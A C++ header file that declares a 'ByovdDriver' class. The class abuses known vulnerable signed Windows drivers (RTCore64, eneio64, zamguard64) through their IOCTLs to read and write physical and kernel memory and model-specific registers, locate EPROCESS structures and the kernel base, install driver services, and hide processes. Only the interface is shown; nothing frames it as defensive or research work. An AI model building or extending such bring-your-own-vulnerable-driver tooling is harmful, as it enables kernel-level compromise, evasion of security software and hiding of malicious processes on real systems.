#pragma once
#include <windows.h>
#include <cstdint>
#include <string>
#include <vector>
#include "Logger.h"

class ByovdDriver {
public:
    explicit ByovdDriver(Logger* logger);
    ~ByovdDriver();

    enum DriverType {
        DRIVER_NONE = 0,
        DRIVER_RTCORE64,     // MSI Afterburner (RTCore64.sys)
        DRIVER_ENEIO64,      // ENE hardware monitoring (eneio64.sys)
        DRIVER_ZAMGUARD64,   // Zemana Anti-Malware (zamguard64.sys)
        DRIVER_CUSTOM,       // User-specified driver path
    };

    struct DriverInfo {
        DriverType type;
        std::wstring devicePath;     // e.g. L"\\\\.\\RTCore64"
        std::wstring driverName;     // e.g. L"RTCore64"
        DWORD ioctlReadPhysical;     // IOCTL for physical memory read
        DWORD ioctlWritePhysical;    // IOCTL for physical memory write
        DWORD ioctlReadMsr;          // IOCTL for MSR read (optional)
        DWORD ioctlWriteMsr;         // IOCTL for MSR write (optional)
        bool supportsVirtAddr;       // Whether driver supports virtual address R/W
    };

    bool FindDriver();
    bool OpenDriver(const wchar_t* customPath = nullptr);
    void CloseDriver();

    bool IsAvailable() const { return m_deviceHandle != INVALID_HANDLE_VALUE; }
    DriverType GetActiveType() const { return m_activeType; }

    bool ReadPhysicalMemory(uint64_t physicalAddr, void* buffer, uint32_t size);
    bool WritePhysicalMemory(uint64_t physicalAddr, const void* buffer, uint32_t size);
    bool ReadMsr(uint32_t msrIndex, uint64_t* value);
    bool WriteMsr(uint32_t msrIndex, uint64_t value);

    uint64_t GetPhysicalAddress(uint64_t virtualAddr);

    bool HideProcess(uint32_t pid);
    bool HideProcessPath(const wchar_t* processPath);

    bool ReadKernelMemory(uint64_t kernelAddr, void* buffer, uint32_t size);
    bool WriteKernelMemory(uint64_t kernelAddr, const void* buffer, uint32_t size);

    struct KProcessInfo {
        uint64_t eprocess;      // EPROCESS address
        uint64_t pid;           // Process ID
        uint64_t imageFileName; // offset to ImageFileName in EPROCESS
    };
    bool GetKProcessInfo(uint32_t pid, KProcessInfo& info);

private:
    Logger* m_logger;
    HANDLE m_deviceHandle;
    DriverType m_activeType;
    DriverInfo m_driverInfo;
    bool m_scmInitialized;

    static const uint32_t DRIVER_SERVICE_TYPE = 1;

    bool TryOpenRTCore64();
    bool TryOpenEneIo64();
    bool TryOpenZamGuard64();

    bool InstallDriver(const wchar_t* driverPath, const wchar_t* serviceName);
    bool RemoveDriver(const wchar_t* serviceName);

    uint64_t m_kernelBase = 0;
    uint64_t FindKernelBase();
};

extern ByovdDriver* g_byovdDriver;
